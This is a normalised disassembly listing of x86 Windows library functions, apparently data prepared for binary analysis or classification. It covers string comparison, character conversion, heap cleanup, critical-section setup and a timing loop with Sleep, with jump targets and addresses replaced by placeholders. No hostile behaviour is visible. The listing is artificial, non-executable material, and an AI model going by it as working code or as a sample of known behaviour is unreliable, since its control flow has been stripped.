call sub_10062fcf
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
mov [ esi + edi ] bl
mov ebx 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
pop esi
mov eax ebx
pop ebx
mov [ esi + edi ] bl
pop esi
mov eax ebx
pop ebx
pop ebp
retn
sub_1002b290
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
pop ebp
retn
cmp esi 0x1
jbe r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_1002b306
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not eax
and ax [ ebp - 0x4 ]
or ax cx
movzx eax ax
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_1002b340
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
add ecx [ ebp + 0x8 ]
push eax
movsx eax [ ebp + 0x10 ]
push eax
push ecx
call sub_1007f940
add esp 0xc
pop ebp
retn 0xc
mov ecx [ ecx ]
mov al [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx ] al
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_1002b37e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
push esi
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1003cc03
movzx esi ax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
add ebx 0x2
call sub_1003cc03
add esp 0x10
add edi 0x2
movzx eax ax
test si si
je r-xdata
sub ebx edi
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
cmp si ax
je r-xdata
mov esi eax
cmp eax 0x5a
ja r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
add edi 0x2
test si si
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp eax 0x41
jb r-xdata
movzx eax [ ebx + edi ]
cmp eax 0x41
jb r-xdata
jmp r-xdata
sub_1002b481
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10059a40
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_1002b520
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov ecx [ edi + 0x28 ]
push 0xffffffff
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0x48 ]
push 0x0
lea eax [ edi + 0x2c ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x48 ] edx
call sub_100404a0
mov ecx [ edi + 0x4c ]
mov [ esi + 0x4c ] ecx
mov edx [ edi + 0x50 ]
mov [ esi + 0x50 ] edx
mov eax [ edi + 0x58 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x5c ]
mov [ esi + 0x5c ] ecx
mov edx [ edi + 0x68 ]
mov [ esi + 0x68 ] edx
mov eax [ edi + 0x6c ]
mov [ esi + 0x6c ] eax
sub_1002b580
push ebx
mov ebx [ esi + 0x4 ]
push edi
xor edi edi
test ebx ebx
je r-xdata
mov eax [ esi ]
pop edi
pop ebx
test eax eax
je r-xdata
jmp r-xdata
retn
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi ] 0x0
mov eax [ esi ]
cmp [ eax + edi * 4 ] 0x0
lea eax [ eax + edi * 4 ]
je r-xdata
dec [ esi + 0x4 ]
inc edi
cmp edi ebx
jb r-xdata
mov ecx [ eax ]
push ecx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ esi ]
mov [ edx + edi * 4 ] 0x0
sub_1002b5dd
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_1002b630
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x20 ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x24 ]
mov [ ecx + 0x8 ] edx
mov edx [ eax + 0x28 ]
mov [ ecx + 0xc ] edx
mov eax [ eax + 0x4 ]
mov [ ecx + 0x10 ] eax
pop ebp
retn
sub_1002b66a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
call sub_100427ff
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_1006299d
mov [ eax ] 0x2a
call sub_1006299d
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_1006299d
push 0x22
pop esi
mov [ eax ] esi
call sub_100427ff
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_1007f940
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_1007f940
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_1002b7bf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_1001b67e
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp + 0x20 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_1003c746
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_1007f360
add esp 0xc
test eax eax
je r-xdata
sub_1002b851
push 0x6c
mov eax sub_100852b2
call sub_1003fae8
mov eax [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0x70 ]
push eax
mov [ ebp - 0x74 ] edi
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_100188c2
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ ebp - 0x70 ]
mov [ ebp - 0x6c ] ebx
call sub_10034a80
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_1000ff3d
push [ ebp - 0x58 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x51 ] 0x0
call sub_100463af
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
mov edi [ ebp - 0x58 ]
and [ ebp - 0x60 ] 0x0
and [ ebp - 0x64 ] 0x0
mov [ eax ] 0x7830
add eax 0x2
push edi
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x49 ] 0x0
call sub_100463af
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ edi ] 0x2b
jmp r-xdata
push edi
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov ecx esi
call sub_1005f1e2
push edi
mov ecx esi
call sub_100463af
test al al
jne r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_10045d3b
inc edi
mov ecx esi
mov [ ebp - 0x50 ] edi
call sub_1005f1e2
mov ecx esi
call sub_100463af
test al al
je r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x49 ] 0x1
cmp [ esi + 0x4 ] al
jne r-xdata
mov [ edi ] 0x2d
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x78
je r-xdata
mov ecx esi
call sub_10045d3b
movzx eax [ esi + 0x5 ]
push 0x41
push 0x61
push 0x30
push eax
push [ ebp + 0x8 ]
call sub_1006ffad
mov edi eax
add esp 0x14
test edi edi
js r-xdata
mov ecx esi
call sub_10045d3b
push [ ebp - 0x58 ]
mov ecx esi
call sub_100463af
test al al
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
mov [ ebp - 0x59 ] al
mov [ ebp - 0x59 ] 0x0
jmp r-xdata
mov ecx esi
call sub_1005f1e2
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x24
jl r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
and [ ebp - 0x1c ] 0x0
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
call sub_100405c0
push edi
mov ecx esi
mov [ ebp - 0x4 ] 0x2
xor ebx ebx
call sub_100463af
test al al
jne r-xdata
cmp [ esi + 0x5 ] 0x58
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x64 ]
jmp r-xdata
push [ ebp - 0x58 ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
mov edi [ ebp - 0x50 ]
jmp r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
mov bl [ esi + 0x5 ]
call [ eax + 0x4 ]
cmp bl al
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
mov al [ esi + 0x5 ]
push 0x41
push 0x61
mov [ ebp - 0x78 ] al
push 0x30
push [ ebp - 0x78 ]
push [ ebp + 0x8 ]
call sub_1006ffad
mov edi eax
add esp 0x14
test edi edi
js r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10045d3b
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f1e2
push [ ebp - 0x58 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x64 ] 0x0
mov edi [ ebp - 0x50 ]
jge r-xdata
push [ ebp - 0x58 ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
call sub_1002f11b
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1005f1e2
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1002c8c0
jmp r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x60 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10045d3b
mov [ edi ] 0x30
inc edi
inc [ ebp - 0x64 ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x64 ]
jmp r-xdata
dec [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f1e2
movzx eax [ esi + 0x5 ]
push 0x41
push 0x61
push 0x30
push eax
push [ ebp + 0x8 ]
call sub_1006ffad
add esp 0x14
test eax eax
js r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
mov ecx esi
call sub_100463af
test al al
jne r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x59 ] 0x0
je r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x60 ] 0x24
jge r-xdata
mov edi [ ebp - 0x74 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f1e2
mov al [ eax + r--data ]
mov [ edi ] al
inc edi
inc [ ebp - 0x60 ]
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x64 ]
mov [ edi ] 0x0
push 0x0
mov [ eax ] ecx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
xor eax eax
call sub_1004642f
retn
cmp [ esi + 0x5 ] 0x70
je r-xdata
mov ecx esi
call sub_10045d3b
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x59 ]
cmp [ esi + 0x5 ] al
jne r-xdata
mov ecx esi
call sub_10045d3b
mov ecx esi
call sub_1005f1e2
push [ ebp - 0x58 ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov [ edi ] 0x70
mov ecx esi
inc edi
call sub_1005f1e2
push [ ebp - 0x58 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_100463af
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
inc ebx
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x58 ]
mov ecx esi
call sub_100463af
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x50
jne r-xdata
mov ecx esi
call sub_10045d3b
push [ ebp - 0x58 ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x4 ] bl
jne r-xdata
mov [ edi ] 0x2b
jmp r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f1e2
push [ ebp - 0x58 ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_10045d3b
mov ecx esi
inc edi
call sub_1005f1e2
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov [ edi ] 0x2d
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10045d3b
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f1e2
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x5 ]
mov [ edi ] al
inc edi
inc ebx
mov ecx esi
call sub_10045d3b
sub_1002be1e
push 0x8
push r--data
call sub_1007fb20
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_10058c10
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002bec0
push 0xc
call sub_10058c10
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_10053319
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002bec9
call sub_1007fb65
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_1002bee0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a050
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ rw-data ]
cmp [ ebx + 0xb4 ] 0x10
mov eax [ ebp + 0x8 ]
mov esi [ ebx + 0xb0 ]
mov [ ebp - 0x128 ] ecx
lea ecx [ ebx + 0xa0 ]
mov [ ebp - 0x12c ] eax
mov [ ebp - 0x10c ] ebx
mov eax esi
jb r-xdata
push 0x0
push r--data
push ecx
call sub_1002b290
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ecx ]
sete al
test al al
je r-xdata
test esi esi
setne al
test eax eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax 0x44
jmp r-xdata
mov [ ebp - 0xf9 ] 0x0
mov eax 0x45
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov edi ebx
call sub_10011dc0
mov esi eax
xor eax eax
mov [ ebp - 0x108 ] esi
cmp esi eax
je r-xdata
mov eax [ ebx + 0xc4 ]
mov edx [ ebx + 0xc8 ]
sub edx eax
sar edx 0x2
test edx edx
je r-xdata
lea ecx [ ebp - 0xc0 ]
call sub_1004c8c0
mov eax 0x43
jmp r-xdata
jmp r-xdata
mov ecx [ ebx + 0xc8 ]
mov esi [ ebx + 0xc4 ]
cmp esi ecx
je r-xdata
nop
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] eax
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x4 ] 0x1
call [ GetTickCount@IAT ]
lea edx [ ebp - 0xc0 ]
push edx
push esi
lea edx [ ebp - 0x124 ]
lea ecx [ ebx + 0xa0 ]
mov edi eax
call sub_1002fc40
mov esi eax
mov [ ebp - 0x130 ] esi
call [ GetTickCount@IAT ]
sub eax edi
mov [ ebp - 0x110 ] eax
fild [ ebp - 0x110 ]
jns r-xdata
mov [ ebp - 0xf9 ] 0x0
mov eax ecx
sub eax ecx
sar eax 0x2
lea edi [ eax * 4 ]
push edi
push ecx
push esi
call sub_1007ec90
add esp 0xc
add esi edi
mov [ ebx + 0xc8 ] esi
mov eax [ ebx + 0xc4 ]
mov ecx [ ebx + 0xc8 ]
sub ecx eax
inc edi
sar ecx 0x2
cmp edi ecx
jb r-xdata
mov esi eax
call sub_10059b00
fmul [ ebx + 0xfc ]
fnstcw [ ebp - 0xfe ]
movzx eax [ ebp - 0xfe ]
or eax 0xc00
mov [ ebp - 0x104 ] eax
fldcw [ ebp - 0x104 ]
fistp [ ebp - 0x114 ]
mov eax [ ebp - 0x114 ]
push eax
fldcw [ ebp - 0xfe ]
call [ Sleep@IAT ]
cmp esi 0x42
je r-xdata
fadd [ r--data ]
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x108 ]
mov [ ecx + 0xd4 ] 0x0
jmp r-xdata
cmp esi 0x43
je r-xdata
mov [ ebp - 0xf9 ] 0x1
mov edx [ ebp - 0x108 ]
mov [ edx + 0xd4 ] 0x0
mov eax [ ebp - 0x120 ]
xor edx edx
cmp esi edx
mov esi [ ebp - 0x124 ]
jne r-xdata
xor edi edi
push edi
push r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0xac ] 0xf
mov [ ebp - 0xb0 ] edi
mov [ ebp - 0xc0 ] 0x0
call sub_10037e00
cmp [ ebp - 0xf9 ] 0x0
mov [ ebp - 0x4 ] edi
je r-xdata
sub eax esi
sar eax 0x5
mov [ ebp - 0x104 ] edx
mov [ ebp - 0x110 ] eax
cmp eax edx
jbe r-xdata
mov ecx eax
sub ecx esi
test ecx 0xffffffe0
je r-xdata
cmp [ ebp - 0xf9 ] 0x0
jne r-xdata
mov [ ebp - 0x100 ] esi
cmp [ ebp - 0xac ] 0x10
mov ecx [ ebp - 0xc0 ]
mov [ ebp - 0xb0 ] edx
jae r-xdata
lea esi [ ebp - 0x124 ]
call sub_10070ef0
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_1004c8c0
jmp r-xdata
lea esi [ ebp - 0x124 ]
mov [ ebp - 0x4 ] 0x0
call sub_10070ef0
cmp [ ebp - 0x130 ] 0x4
je r-xdata
mov eax [ ebp - 0x104 ]
inc eax
add esi 0x20
mov [ ebp - 0x104 ] eax
mov [ ebp - 0x100 ] esi
cmp eax [ ebp - 0x110 ]
jb r-xdata
mov edx esi
mov ecx ebx
call sub_100611b0
mov edi eax
test edi edi
js r-xdata
mov [ ecx ] dl
lea ecx [ ebp - 0xc0 ]
mov eax [ ebx + 0xc4 ]
mov ecx [ ebx + 0xc8 ]
sub ecx eax
xor edx edx
sar ecx 0x2
mov [ ebp - 0x100 ] edx
test ecx ecx
je r-xdata
mov esi [ ebp - 0x108 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov eax [ esi ]
push eax
lea esi [ ebp - 0x34 ]
call sub_1006cba0
add esp 0x4
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x2
call sub_1005e580
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_1004c8c0
mov ecx [ ebx + 0xc4 ]
add edi edi
